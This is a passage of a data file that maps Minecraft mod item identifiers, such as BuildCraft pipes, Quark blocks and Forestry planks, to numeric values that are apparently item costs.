  ""buildcrafttransport:pipe_iron_power|8"": 128,
  ""buildcrafttransport:pipe_iron_power|9"": 128,
  ""buildcrafttransport:pipe_iron_power|14"": 128,
  ""buildcrafttransport:pipe_iron_power|15"": 128,
  ""chisel:basalt2|7"": 1,
  ""buildcrafttransport:pipe_iron_power|12"": 128,
  ""buildcrafttransport:pipe_iron_power|13"": 128,
  ""extratrees:doors.rowan|0"": 16,
  ""chisel:glassdyedwhite|5"": 1,
  ""chisel:glassdyedwhite|4"": 1,
  ""chisel:glassdyedwhite|3"": 1,
  ""chisel:glassdyedwhite|2"": 1,
  ""chisel:glassdyedwhite|1"": 1,
  ""chisel:glassdyedwhite|0"": 1,
  ""ic2:itemmisc|3"": 256,
  ""ic2:itemmisc|2"": 128,
  ""ic2:itemmisc|1"": 2048,
  ""ic2:itemmisc|0"": 256,
  ""ic2:itemmisc|5"": 512,
  ""ic2:itemmisc|4"": 160,
  ""quark:world_stone_pavement|5"": 1,
  ""quark:fire_stone_brick_wall|0"": 64,
  ""railcraft:pearlized_paver_stairs|0"": 96,
  ""quark:world_stone_pavement|2"": 16,
  ""minecraft:mossy_cobblestone|0"": 9,
  ""quark:world_stone_pavement|1"": 16,
  ""quark:stained_planks_cyan_stairs|0"": 6,
  ""quark:world_stone_pavement|0"": 16,
  ""forestry:leaves.decorative.0|14"": 1,
  ""forestry:leaves.decorative.1|15"": 1,
  ""forestry:leaves.decorative.0|15"": 1,
  ""forestry:leaves.decorative.1|14"": 1,
  ""forestry:leaves.decorative.0|12"": 1,
  ""forestry:leaves.decorative.1|13"": 1,
  ""forestry:leaves.decorative.0|13"": 1,
  ""forestry:leaves.decorative.1|12"": 1,
  ""forestry:leaves.decorative.0|10"": 1,
  ""forestry:leaves.decorative.1|11"": 1,
  ""forestry:leaves.decorative.0|11"": 1,
  ""forestry:leaves.decorative.1|10"": 1,
  ""quark:stained_planks_light_blue_stairs|0"": 6,
  ""forestry:leaves.decorative.0|8"": 1,
  ""forestry:leaves.decorative.1|9"": 1,
  ""quark:stained_clay_tiles_gray_stairs|0"": 48,
  ""forestry:leaves.decorative.0|9"": 1,
  ""forestry:leaves.decorative.1|8"": 1,
  ""forestry:leaves.decorative.0|6"": 1,
  ""forestry:leaves.decorative.1|7"": 1,
  ""forestry:leaves.decorative.0|7"": 1,
  ""forestry:leaves.decorative.1|6"": 1,
  ""forestry:leaves.decorative.0|4"": 1,
  ""forestry:leaves.decorative.1|5"": 1,
  ""forestry:leaves.decorative.0|5"": 1,
  ""forestry:leaves.decorative.1|4"": 1,
  ""forestry:leaves.decorative.0|2"": 1,
  ""forestry:leaves.decorative.1|3"": 1,
  ""forestry:leaves.decorative.0|3"": 1,
  ""forestry:leaves.decorative.1|2"": 1,
  ""forestry:leaves.decorative.0|0"": 1,
  ""forestry:leaves.decorative.1|1"": 1,
  ""forestry:leaves.decorative.0|1"": 1,
  ""forestry:leaves.decorative.1|0"": 1,
  ""buildcrafttransport:pipe_quartz_power|8"": 320,
  ""minecraft:golden_axe|0"": 6152,
  ""buildcrafttransport:pipe_quartz_power|9"": 320,
  ""buildcrafttransport:pipe_quartz_power|10"": 320,
  ""buildcrafttransport:pipe_quartz_power|11"": 320,
  ""buildcrafttransport:pipe_quartz_power|12"": 320,
  ""quark:roots_white_flower|0"": 24,
  ""buildcrafttransport:pipe_quartz_power|13"": 320,
  ""buildcrafttransport:pipe_quartz_power|14"": 320,
  ""buildcrafttransport:pipe_quartz_power|15"": 320,
  ""minecraft:dark_oak_door|0"": 16,
  ""buildcrafttransport:pipe_quartz_power|1"": 320,
  ""buildcrafttransport:pipe_quartz_power|2"": 320,
  ""buildcrafttransport:pipe_quartz_power|3"": 320,
  ""buildcrafttransport:pipe_quartz_power|4"": 320,
  ""buildcrafttransport:pipe_quartz_power|5"": 320,
  ""minecraft:cooked_beef|0"": 64,
  ""buildcrafttransport:pipe_quartz_power|6"": 320,
  ""buildcrafttransport:pipe_quartz_power|7"": 320,
  ""ic2:itemmisc|51"": 256,
  ""extratrees:doors.pinkivory|0"": 16,
  ""ic2:itemmisc|50"": 128,
  ""ic2:itemmisc|54"": 512,
  ""buildcrafttransport:pipe_quartz_power|16"": 320,
  ""quark:bark_oak_stairs|0"": 24,
  ""ironchest:gold_diamond_shulker_upgrade|0"": 18438,
  ""minecraft:clay_ball|0"": 16,
  ""chisel:stonebrick|10"": 1,
  ""chisel:stonebrick|11"": 1,
  ""chisel:stonebrick|8"": 1,
  ""chisel:stonebrick|9"": 1,
  ""chisel:stonebrick|14"": 1,
  ""chisel:stonebrick|15"": 1,
  ""chisel:stonebrick|12"": 1,
  ""chisel:stonebrick|13"": 1,
  ""chisel:stonebrick|2"": 1,
  ""chisel:stonebrick|3"": 1,
  ""chisel:stonebrick|0"": 1,
  ""chisel:stonebrick|1"": 1,
  ""chisel:stonebrick|6"": 1,
  ""chisel:stonebrick|7"": 1,
  ""chisel:stonebrick|4"": 1,
  ""chisel:stonebrick|5"": 1,
  ""extratrees:fence.gates.banana|0"": 32,
  ""blockcraftery:editable_pressure_plate_player_reinforced|0"": 41,
  ""botany:trowel_diamond|0"": 8197,
  ""forestry:stairs.papaya|0"": 6,
  ""quark:diorite_speleothem|0"": 8,
  ""buildcrafttransport:pipe_diamond_power|16"": 2112,
  ""buildcrafttransport:pipe_diamond_power|12"": 2112,
  ""buildcrafttransport:pipe_diamond_power|13"": 2112,
  ""buildcrafttransport:pipe_diamond_power|14"": 2112,
  ""buildcrafttransport:pipe_diamond_power|15"": 2112,
  ""buildcrafttransport:pipe_diamond_power|8"": 2112,
  ""buildcrafttransport:pipe_diamond_power|9"": 2112,
  ""buildcrafttransport:pipe_diamond_power|10"": 2112,
  ""minecraft:brown_mushroom|0"": 32,
  ""buildcrafttransport:pipe_diamond_power|11"": 2112,
  ""buildcrafttransport:pipe_diamond_power|4"": 2112,
  ""buildcrafttransport:pipe_diamond_power|5"": 2112,
  ""extratrees:stairs.fig|0"": 6,
  ""buildcrafttransport:pipe_diamond_power|6"": 2112,
  ""buildcrafttransport:pipe_diamond_power|7"": 2112,
  ""buildcrafttransport:pipe_diamond_power|1"": 2112,
  ""quark:bark_spruce_wall|0"": 32,
  ""buildcrafttransport:pipe_diamond_power|2"": 2112,
  ""buildcrafttransport:pipe_diamond_power|3"": 2112,
  ""minecraft:dark_oak_fence_gate|0"": 32,
  ""extratrees:stairs.fir|0"": 6,
  ""cathedral:basalt_stairs_checkered_normal|0"": 1,
  ""forestry:planks.0|1"": 8,
  ""forestry:planks.1|2"": 8,
  ""forestry:planks.0|0"": 8,
  ""forestry:planks.1|3"": 8,
  ""forestry:planks.0|3"": 8,
  ""forestry:planks.1|0"": 8,
  ""forestry:planks.0|2"": 8,
  ""forestry:planks.1|1"": 8,
  ""forestry:planks.0|5"": 8,
  ""forestry:planks.1|6"": 8,
  ""minecraft:iron_ingot|0"": 256,
  ""forestry:planks.0|4"": 8,
  ""forestry:planks.1|7"": 8,
  ""minecraft:tnt_minecart|0"": 2244,
  ""forestry:planks.0|7"": 8,
  ""forestry:planks.1|4"": 8,
  ""forestry:planks.0|6"": 8,
  ""forestry:planks.1|5"": 8,
  ""forestry:planks.0|9"": 8,
  ""forestry:planks.1|10"": 8,
  ""forestry:planks.0|8"": 8,
  ""forestry:planks.1|11"": 8,
  ""forestry:planks.0|11"": 8,
  ""forestry:planks.1|8"": 8,
  ""forestry:planks.0|10"": 8,
  ""forestry:planks.1|9"": 8,
  ""forestry:planks.0|13"": 8,
  ""forestry:planks.0|12"": 8,
  ""forestry:planks.0|15"": 8,
  ""forestry:planks.1|12"": 8,
  ""forestry:planks.0|14"": 8,
  ""buildcrafttransport:pipe_sandstone_power|16"": 65,
  ""minecraft:diamond_chestplate|0"": 65536,
  ""buildcrafttransport:pipe_sandstone_power|1"": 65,
  ""buildcrafttransport:pipe_sandstone_power|3"": 65,
  ""buildcrafttransport:pipe_sandstone_power|2"": 65,
  ""galacticraftcore:oil_canister_partial|1"": 2816,
  ""buildcrafttransport:pipe_sandstone_power|5"": 65,
  ""buildcrafttransport:pipe_sandstone_power|4"": 65,
  ""buildcrafttransport:pipe_sandstone_power|7"": 65,
  ""ic2:itemmisc|180"": 4096,
  ""buildcrafttransport:pipe_sandstone_power|6"": 65,
  ""buildcrafttransport:pipe_sandstone_power|9"": 65,
  ""buildcrafttransport:pipe_sandstone_power|8"": 65,
  ""buildcrafttransport:pipe_sandstone_power|11"": 65,
  ""buildcrafttransport:pipe_sandstone_power|10"": 65,
  ""minecraft:sandstone|0"": 4,
  ""buildcrafttransport:pipe_sandstone_power|13"": 65,
  ""minecraft:sandstone|1"": 4,
  ""buildcrafttransport:pipe_sandstone_power|12"": 65,
  ""minecraft:sandstone|2"": 4,
  ""buildcrafttransport:pipe_sandstone_power|15"": 65,
  ""buildcrafttransport:pipe_sandstone_power|14"": 65,
  ""forestry:stairs.mahoe|0"": 6,
  ""quark:granite_speleothem|0"": 8,
  ""projecte:fuel_block|1"": 18432,
  ""projecte:fuel_block|0"": 4608,
  ""projecte:fuel_block|2"": 73728,
  ""irontanks:diamond_obsidian_upgrade|0"": 8704,
  ""projectred-exploration:ruby_hoe|0"": 2056,
  ""minecraft:cooked_rabbit|0"": 64,
  ""projectred-exploration:sapphire_sword|0"": 2052,
  ""chisel:tyrian|0"": 8,
  ""minecraft:golden_rail|0"": 2059,
  ""minecraft:oak_stairs|0"": 6,
  ""minecraft:grass|0"": 1,
  ""quark:sandstone_wall|0"": 4,
  ""buildcrafttransport:pipe_wood_item|5"": 2,
  ""quark:blaze_lantern|0"": 9984,
  ""buildcrafttransport:pipe_wood_item|4"": 2,
  ""mocreatures:wyvstone_button|0"": 2,
  ""buildcrafttransport:pipe_wood_item|7"": 2,
  ""minecraft:birch_fence|0"": 13,
  ""buildcrafttransport:pipe_wood_item|6"": 2,
  ""buildcrafttransport:pipe_wood_item|1"": 2,
  ""forestry:fence.gates.mahogany|0"": 32,
  ""buildcrafttransport:pipe_wood_item|3"": 2,
  ""buildcrafttransport:pipe_wood_item|2"": 2,
  ""buildcrafttransport:pipe_wood_item|13"": 2,
  ""buildcrafttransport:pipe_wood_item|12"": 2,
  ""buildcrafttransport:pipe_wood_item|15"": 2,
  ""buildcrafttransport:pipe_wood_item|14"": 2,
  ""buildcrafttransport:pipe_wood_item|9"": 2,
  ""buildcrafttransport:pipe_wood_item|8"": 2,
  ""buildcrafttransport:pipe_wood_item|11"": 2,
  ""quark:reed_block|0"": 288,
  ""buildcrafttransport:pipe_wood_item|10"": 2,
  ""buildcrafttransport:pipe_wood_item|16"": 2,
  ""quark:stained_planks_light_blue_slab|0"": 4,
  ""quark:paper_wall_sakura|0"": 52,
  ""minecraft:lava_bucket|0"": 832,
  ""chisel:glassdyedcyan|3"": 1,
  ""chisel:glassdyedcyan|2"": 1,
  ""chisel:glassdyedcyan|1"": 1,
  ""chisel:glassdyedcyan|0"": 1,
  ""chisel:glassdyedcyan|5"": 1,
  ""chisel:glassdyedcyan|4"": 1,
  ""chisel:temple|0"": 55,
  ""projectred-exploration:sapphire_pickaxe|0"": 3080,
  ""quark:charred_nether_bricks|0"": 114,
  ""quark:red_sandstone_bricks_stairs|0"": 3,
  ""quark:iron_plate|0"": 89,
  ""quark:iron_plate|1"": 85,
  ""quark:stained_planks_brown_stairs|0"": 6,
  ""blockcraftery:editable_inner_corner|0"": 6,
  ""quark:limestone|0"": 1,
  ""quark:limestone|1"": 1,
  ""projecte:interdiction_torch|0"": 25864,
  ""projectred-exploration:peridot_pickaxe|0"": 3080,
  ""forestry:leaves.decorative.2|0"": 1,
  ""forestry:leaves.decorative.2|1"": 1,
  ""minecraft:stone_axe|0"": 11,
  ""forestry:leaves.decorative.2|2"": 1,
  ""irontanks:silver_tank|0"": 1812,
  ""extratrees:stairs.hazel|0"": 6,
  ""extratrees:fence.gates.hazel|0"": 32,
  ""minecraft:cactus|0"": 8,
  ""minecraft:fence_gate|0"": 32,
  ""railcraft:ingot|9"": 153,
  ""railcraft:ingot|8"": 256,
  ""blockcraftery:editable_slab|0"": 8,
  ""minecraft:emerald|0"": 16384,
  ""quark:stained_planks_pink_slab|0"": 4,
  ""railcraft:ingot|3"": 512,
  ""railcraft:ingot|2"": 256,
  ""railcraft:ingot|1"": 128,
  ""railcraft:ingot|7"": 512,
  ""railcraft:ingot|6"": 1024,
  ""railcraft:ingot|5"": 160,
  ""railcraft:ingot|4"": 512,
  ""chisel:marble2|7"": 4,
  ""ironchest:iron_gold_shulker_upgrade|0"": 16640,
  ""railcraft:frostbound|4"": 136,
  ""railcraft:frostbound|5"": 112,
  ""railcraft:frostbound|0"": 112,
  ""railcraft:frostbound|1"": 112,
  ""railcraft:frostbound|2"": 112,
  ""railcraft:frostbound|3"": 112,
  ""quark:prismarine_bricks_stairs|0"": 1728,
  ""quark:biome_brick|1"": 64,
  ""projecte:rm_furnace|0"": 10059784,
  ""quark:biome_brick|0"": 64,
  ""minecraft:carpet|0"": 32,
  ""minecraft:carpet|1"": 33,
  ""minecraft:carpet|2"": 33,
  ""minecraft:carpet|3"": 33,
  ""minecraft:carpet|4"": 33,
  ""minecraft:carpet|5"": 34,
  ""quark:magma_bricks_slab|0"": 32,
  ""minecraft:carpet|6"": 33,
  ""minecraft:carpet|7"": 34,
  ""minecraft:carpet|8"": 33,
  ""minecraft:carpet|9"": 68,
  ""minecraft:carpet|10"": 68,
  ""minecraft:carpet|11"": 104,
  ""minecraft:wooden_sword|0"": 20,
  ""minecraft:carpet|12"": 42,
  ""minecraft:carpet|13"": 32,
  ""minecraft:carpet|14"": 33,
  ""minecraft:carpet|15"": 33,
  ""minecraft:cooked_fish|0"": 64,
  ""minecraft:cooked_fish|1"": 64,
  ""minecraft:stone_slab2|0"": 2,
  ""quark:stained_planks_orange_stairs|0"": 6,
  ""minecraft:rabbit|0"": 64,
  ""quark:colored_flowerpot_lime|0"": 76,
  ""mocreatures:wyvwood_sapling|0"": 32,
  ""minecraft:cooked_porkchop|0"": 64,
  ""blockcraftery:editable_outer_corner_reinforced|0"": 8,
  ""blockcraftery:editable_slant_reinforced|0"": 16,
  ""blockcraftery:editable_wall_reinforced|0"": 33,
  ""minecraft:jungle_door|0"": 16,
  ""minecraft:bucket|0"": 768,
  ""quark:cobblestone_mossy_stairs|0"": 6,
  ""forestry:doors.cocobolo|0"": 16,
  ""quark:purpur_block_wall|0"": 192,
  ""minecraft:writable_book|0"": 224,
  ""extratrees:fence.gates.ash|0"": 32,
  ""quark:bark_dark_oak_stairs|0"": 24,
  ""galacticraftcore:space_glass_vanilla|0"": 205,
  ""extratrees:fences.0|1"": 13,
  ""extratrees:fences.1|2"": 13,
  ""extratrees:fences.2|3"": 13,
  ""extratrees:fences.1|3"": 13,
  ""extratrees:fences.0|0"": 13,
  ""extratrees:fences.2|2"": 13,
  ""extratrees:fences.2|1"": 13,
  ""extratrees:fences.0|3"": 13,
  ""extratrees:fences.1|0"": 13,
  ""extratrees:fences.0|2"": 13,
  ""extratrees:fences.1|1"": 13,
  ""extratrees:fences.2|0"": 13,
  ""extratrees:fences.0|5"": 13,
  ""extratrees:fences.1|6"": 13,
  ""extratrees:fences.0|4"": 13,
  ""extratrees:fences.1|7"": 13,
  ""extratrees:fences.1|4"": 13,
  ""extratrees:fences.0|7"": 13,
  ""extratrees:fences.0|6"": 13,
  ""extratrees:fences.1|5"": 13,
  ""extratrees:fences.0|9"": 13,
  ""extratrees:fences.1|10"": 13,
  ""extratrees:fences.0|8"": 13,
  ""extratrees:fences.1|11"": 13,
  ""chisel:bookshelf_spruce|0"": 504,
  ""extratrees:fences.0|11"": 13,
  ""extratrees:fences.1|8"": 13,
  ""extratrees:fences.1|9"": 13,
  ""extratrees:fences.0|10"": 13,
  ""extratrees:fences.0|13"": 13,
  ""extratrees:fences.1|14"": 13,
  ""extratrees:fences.0|12"": 13,
  ""extratrees:fences.1|15"": 13,
  ""extratrees:fences.0|15"": 13,
  ""extratrees:fences.1|12"": 13,
  ""extratrees:fences.0|14"": 13,
  ""extratrees:fences.1|13"": 13,
  ""forestry:doors.cherry|0"": 16,
  ""railcraft:brick_abyssal|5"": 32,
  ""quark:stained_planks_white_stairs|0"": 6,
  ""minecraft:clay|0"": 64,
  ""quark:duskbound_block_stairs|0"": 75,
  ""projectred-exploration:peridot_shovel|0"": 1032,
  ""chisel:cloud|0"": 6,
  ""minecraft:yellow_glazed_terracotta|0"": 64,
  ""extratrees:stairs.banana|0"": 6,
  ""forestry:stairs.maple|0"": 6,
  ""extratrees:stairs.maclura|0"": 6,
  ""forestry:fence.gates.larch|0"": 32,
  ""minecraft:cooked_chicken|0"": 64,
  ""buildcrafttransport:pipe_wood_power|6"": 66,
  ""buildcrafttransport:pipe_wood_power|7"": 66,
  ""buildcrafttransport:pipe_wood_power|4"": 66,
  ""minecraft:birch_door|0"": 16,
  ""buildcrafttransport:pipe_wood_power|5"": 66,
  ""galacticraftplanets:mars|4"": 4,
  ""buildcrafttransport:pipe_wood_power|2"": 66,
  ""galacticraftplanets:mars|5"": 4,
  ""buildcrafttransport:pipe_wood_power|3"": 66,
  ""galacticraftplanets:mars|6"": 4,
  ""buildcrafttransport:pipe_wood_power|1"": 66,
  ""buildcrafttransport:pipe_wood_power|14"": 66,
  ""galacticraftplanets:mars|9"": 4,
  ""buildcrafttransport:pipe_wood_power|15"": 66,
  ""forestry:doors.pine|0"": 16,
  ""buildcrafttransport:pipe_wood_power|12"": 66,
  ""buildcrafttransport:pipe_wood_power|13"": 66,
  ""buildcrafttransport:pipe_wood_power|10"": 66,
  ""buildcrafttransport:pipe_wood_power|11"": 66,
  ""buildcrafttransport:pipe_wood_power|8"": 66,
  ""buildcrafttransport:pipe_wood_power|9"": 66,
  ""buildcrafttransport:pipe_wood_power|16"": 66,
  ""mocreatures:wyvstone_wall|0"": 1,
  ""minecraft:golden_shovel|0"": 2056,
  ""minecraft:golden_apple|0"": 16512,
  ""minecraft:golden_apple|1"": 147584,
  ""minecraft:end_rod|0"": 432,
  ""blockcraftery:editable_pressure_plate_items_reinforced|0"": 41,
  ""buildcrafttransport:pipe_daizuli_item|7"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|6"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|5"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|4"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|3"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|2"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|1"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|15"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|14"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|13"": 1996,
  ""quark:dark_oak_pressure_plate|0"": 16,
  ""minecraft:golden_boots|0"": 8192,
  ""buildcrafttransport:pipe_daizuli_item|12"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|11"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|10"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|9"": 1996,
  ""buildcrafttransport:pipe_daizuli_item|8"": 1996,
  ""galacticraftcore:glowstone_torch|0"": 97,
  ""buildcrafttransport:pipe_daizuli_item|16"": 1996,
  ""quark:quilted_wool|11"": 164,
  ""quark:midori_block_wall|0"": 8,
  ""quark:quilted_wool|10"": 111,
  ""minecraft:brick_block|0"": 64,
  ""quark:quilted_wool|9"": 110,
  ""quark:quilted_wool|8"": 58,
  ""quark:quilted_wool|15"": 58,
  ""quark:quilted_wool|14"": 58,
  ""quark:quilted_wool|13"": 57,
  ""quark:quilted_wool|12"": 72,
  ""quark:quilted_wool|3"": 58,
  ""quark:quilted_wool|2"": 58,
  ""quark:quilted_wool|1"": 58,
  ""quark:quilted_wool|0"": 56,
  ""quark:quilted_wool|7"": 60,
  ""quark:quilted_wool|6"": 58,
  ""quark:quilted_wool|5"": 59,
  ""quark:quilted_wool|4"": 58,
  ""quark:stone_andesite_bricks_slab|0"": 8,
  ""minecraft:record_wait|0"": 2048,
  ""buildcrafttransport:pipe_clay_item|16"": 16,
  ""projectred-exploration:stone|0"": 1,
  ""buildcrafttransport:pipe_clay_item|6"": 16,
  ""projectred-exploration:stone|1"": 1,
  ""buildcrafttransport:pipe_clay_item|7"": 16,
  ""projectred-exploration:stone|2"": 1,
  ""buildcrafttransport:pipe_clay_item|4"": 16,
  ""minecraft:glass|0"": 1,
  ""projectred-exploration:stone|3"": 1,
  ""buildcrafttransport:pipe_clay_item|5"": 16,
  ""projectred-exploration:stone|4"": 1,
  ""buildcrafttransport:pipe_clay_item|2"": 16,
  ""projectred-exploration:stone|5"": 9216,
  ""buildcrafttransport:pipe_clay_item|3"": 16,
  ""projectred-exploration:stone|6"": 9216,
  ""projectred-exploration:stone|7"": 9216,
  ""buildcrafttransport:pipe_clay_item|1"": 16,
  ""buildcrafttransport:pipe_clay_item|14"": 16,
  ""galacticraftcore:wall_gc|2"": 2,
  ""buildcrafttransport:pipe_clay_item|15"": 16,
  ""buildcrafttransport:pipe_clay_item|12"": 16,
  ""quark:stone_andesite_bricks_stairs|0"": 12,
  ""projectred-exploration:stone|11"": 1152,
  ""buildcrafttransport:pipe_clay_item|13"": 16,
  ""buildcrafttransport:pipe_clay_item|10"": 16,
  ""buildcrafttransport:pipe_clay_item|11"": 16,
  ""buildcrafttransport:pipe_clay_item|8"": 16,
  ""galacticraftcore:wall_gc|4"": 4,
  ""buildcrafttransport:pipe_clay_item|9"": 16,
  ""minecraft:stick|0"": 4,
  ""quark:bark_dark_oak_wall|0"": 32,
  ""minecraft:speckled_melon|0"": 1832,
  ""extratrees:fence.gates.gingko|0"": 32,
  ""minecraft:iron_trapdoor|0"": 1024,
  ""extratrees:fence.gates.logwood|0"": 32,
  ""extratrees:stairs.sweetgum|0"": 6,
  ""minecraft:spruce_fence|0"": 13,
  ""quark:soul_sandstone|2"": 196,
  ""quark:soul_sandstone|1"": 196,
  ""quark:soul_sandstone|0"": 196,
  ""mocreatures:mossy_cobbled_wyvstone_wall|0"": 2,
  ""chisel:glassdyedlime|1"": 1,
  ""chisel:glassdyedlime|0"": 1,
  ""chisel:glassdyedlime|3"": 1,
  ""chisel:glassdyedlime|2"": 1,
  ""chisel:glassdyedlime|5"": 1,
  ""chisel:glassdyedlime|4"": 1,
  ""quark:birch_pressure_plate|0"": 16,
  ""quark:icy_stone_brick_stairs|0"": 48,
  ""extratrees:doors.maclura|0"": 16,
  ""forestry:fence.gates.balsa|0"": 32,
  ""extratrees:doors.purpleheart|0"": 16,
  ""forestry:ingot_tin|0"": 256,
  ""railcraft:infernal_slab|1"": 26,
  ""railcraft:infernal_slab|0"": 26,
  ""minecraft:dropper|0"": 71,
  ""minecraft:chest|0"": 64,
  ""minecraft:cauldron|0"": 1792,
  ""quark:dark_oak_button|0"": 8,
  ""forestry:fence.gates.sequoia|0"": 32,
  ""forestry:doors.walnut|0"": 16,
  ""quark:framed_glass|0"": 257,
  ""chisel:glassdyedblue|2"": 1,
  ""chisel:glassdyedblue|3"": 1,
  ""chisel:glassdyedblue|0"": 1,
  ""chisel:glassdyedblue|1"": 1,
  ""chisel:glassdyedblue|4"": 1,
  ""chisel:glassdyedblue|5"": 1,
  ""quark:colored_flowerpot_white|0"": 96,
  ""quark:prismarine_stairs|0"": 768,
  ""cathedral:basalt_slab_checkered|0"": 1,
  ""quark:prismarine_bricks_slab|0"": 1152,
  ""minecraft:record_ward|0"": 2048,
  ""forestry:fence.gates.cherry|0"": 32,
  ""minecraft:diamond_helmet|0"": 40960,
  ""quark:stained_planks_orange_slab|0"": 4,
  ""railcraft:infernal_paver_stairs|0"": 39,
  ""minecraft:diamond_leggings|0"": 57344,
  ""minecraft:cookie|0"": 22,
  ""forestry:stairs.citrus|0"": 6,
  ""forestry:doors.palm|0"": 16,
  ""quark:iron_button|0"": 264,
  ""projectred-exploration:stone_wall|1"": 1,
  ""projectred-exploration:stone_wall|0"": 1,
  ""projectred-exploration:stone_wall|3"": 1,
  ""cathedral:cathedral_gargoyle_demon_stone|0"": 253,
  ""projectred-exploration:stone_wall|2"": 1,
  ""projectred-exploration:stone_wall|5"": 9216,
  ""projectred-exploration:stone_wall|4"": 1,
  ""projectred-exploration:stone_wall|7"": 9216,
  ""projectred-exploration:stone_wall|6"": 9216,
  ""projectred-exploration:stone_wall|9"": 2304,
  ""projectred-exploration:stone_wall|8"": 1152,
  ""projectred-exploration:stone_wall|11"": 1152,
  ""projectred-exploration:stone_wall|10"": 4608,
  ""minecraft:hay_block|0"": 216,
  ""quark:arrow_torch|0"": 23,
  ""minecraft:jukebox|0"": 8256,
  ""railcraft:andesite|4"": 40,
  ""railcraft:andesite|5"": 16,
  ""minecraft:ice|0"": 1,
  ""railcraft:andesite|3"": 16,
  ""railcraft:andesite|0"": 16,
  ""railcraft:andesite|1"": 16,
  ""quark:stained_planks_lime_slab|0"": 4,
  ""cathedral:cathedral_gargoyle_demon_obsidian|0"": 505,
  ""minecraft:birch_fence_gate|0"": 32,
  ""quark:colored_item_frame|10"": 536,
  ""quark:colored_item_frame|11"": 960,
  ""quark:colored_item_frame|8"": 112,
  ""quark:colored_item_frame|9"": 532,
  ""quark:colored_item_frame|14"": 112,
  ""quark:colored_item_frame|15"": 112,
  ""buildcrafttransport:pipe_sandstone_item|16"": 1,
  ""quark:colored_item_frame|12"": 224,
  ""quark:colored_item_frame|13"": 104,
  ""quark:colored_item_frame|2"": 112,
  ""quark:colored_item_frame|3"": 112,
  ""quark:colored_item_frame|0"": 144,
  ""quark:colored_item_frame|1"": 112,
  ""quark:colored_item_frame|6"": 112,
  ""quark:colored_item_frame|7"": 128,
  ""quark:colored_item_frame|4"": 112,
  ""quark:colored_item_frame|5"": 124,
  ""chisel:planks-birch|14"": 8,
  ""buildcrafttransport:pipe_sandstone_item|5"": 1,
  ""buildcrafttransport:pipe_sandstone_item|4"": 1,
  ""chisel:planks-birch|12"": 8,
  ""buildcrafttransport:pipe_sandstone_item|7"": 1,
  ""chisel:planks-birch|13"": 8,
  ""buildcrafttransport:pipe_sandstone_item|6"": 1,
  ""chisel:planks-birch|10"": 8,
  ""buildcrafttransport:pipe_sandstone_item|1"": 1,
  ""chisel:planks-birch|11"": 8,
  ""chisel:planks-birch|8"": 8,
  ""buildcrafttransport:pipe_sandstone_item|3"": 1,
  ""chisel:planks-birch|9"": 8,
  ""buildcrafttransport:pipe_sandstone_item|2"": 1,
  ""chisel:planks-birch|6"": 8,
  ""buildcrafttransport:pipe_sandstone_item|13"": 1,
  ""chisel:planks-birch|7"": 8,
  ""buildcrafttransport:pipe_sandstone_item|12"": 1,
  ""chisel:planks-birch|4"": 8,
  ""projectred-exploration:ruby_sword|0"": 2052,
  ""buildcrafttransport:pipe_sandstone_item|15"": 1,
  ""chisel:planks-birch|5"": 8,
  ""buildcrafttransport:pipe_sandstone_item|14"": 1,
  ""chisel:planks-birch|2"": 8,
  ""buildcrafttransport:pipe_sandstone_item|9"": 1,
  ""chisel:planks-birch|3"": 8,
  ""quark:magma_bricks|0"": 64,
  ""buildcrafttransport:pipe_sandstone_item|8"": 1,
  ""chisel:planks-birch|0"": 8,
  ""buildcrafttransport:pipe_sandstone_item|11"": 1,
  ""chisel:planks-birch|1"": 8,
  ""buildcrafttransport:pipe_sandstone_item|10"": 1,
  ""railcraft:nugget|3"": 56,
  ""railcraft:nugget|2"": 28,
  ""railcraft:nugget|1"": 14,
  ""railcraft:nugget|7"": 56,
  ""railcraft:nugget|6"": 113,
  ""ironchest:diamond_crystal_shulker_upgrade|0"": 72,
  ""railcraft:nugget|4"": 56,
  ""railcraft:nugget|9"": 17,
  ""railcraft:nugget|8"": 28,
  ""quark:colored_flowerpot_gray|0"": 80,
  ""blockcraftery:editable_fence_reinforced|0"": 23,
  ""minecraft:ender_pearl|0"": 1024,
  ""railcraft:red_nether|5"": 50,
  ""railcraft:red_nether|4"": 74,
  ""quark:snow_bricks_wall|0"": 1,
  ""quark:icy_stone_brick_slab|0"": 32,
  ""railcraft:red_nether|1"": 50,
  ""railcraft:red_nether|3"": 50,
  ""railcraft:red_nether|2"": 50,
  ""forestry:stairs.walnut|0"": 6,
  ""forestry:doors.giganteum|0"": 16,
  ""forestry:doors.mahogany|0"": 16,
  ""forestry:fence.gates.zebrawood|0"": 32,
  ""forestry:fence.gates.kapok|0"": 32,
  ""irontanks:copper_silver_upgrade|0"": 2177,
  ""minecraft:record_strad|0"": 2048,
  ""quark:roots_black_flower|0"": 24,
  ""chisel:futura|0"": 9,
  ""microblockcbe:saw_iron|0"": 270,
  ""minecraft:red_glazed_terracotta|0"": 64,
  ""quark:stained_clay_tiles_purple_slab|0"": 32,
  ""botany:misc_ceramic|0"": 11,
  ""projectred-exploration:sapphire_hoe|0"": 2056,
  ""minecraft:log2|1"": 32,
  ""minecraft:log2|0"": 32,
  ""extratrees:stairs.brazilwood|0"": 6,
  ""minecraft:pumpkin_pie|0"": 208,
  ""minecraft:quartz_stairs|0"": 768,
  ""railcraft:bloodstained_slab|0"": 18,
  ""quark:carved_wood|2"": 8,
  ""railcraft:bloodstained_slab|1"": 18,
  ""cathedral:cathedral_pillar_various|1"": 3,
  ""quark:carved_wood|3"": 8,
  ""quark:carved_wood|0"": 8,
  ""cathedral:cathedral_pillar_various|2"": 3,
  ""cathedral:cathedral_pillar_various|3"": 48,
  ""quark:carved_wood|1"": 8,
  ""cathedral:cathedral_pillar_various|4"": 3,
  ""cathedral:cathedral_gargoyle_demon_snow|0"": 253,
  ""cathedral:cathedral_pillar_various|5"": 768,
  ""quark:carved_wood|4"": 8,
  ""cathedral:cathedral_pillar_various|7"": 3,
  ""quark:carved_wood|5"": 8,
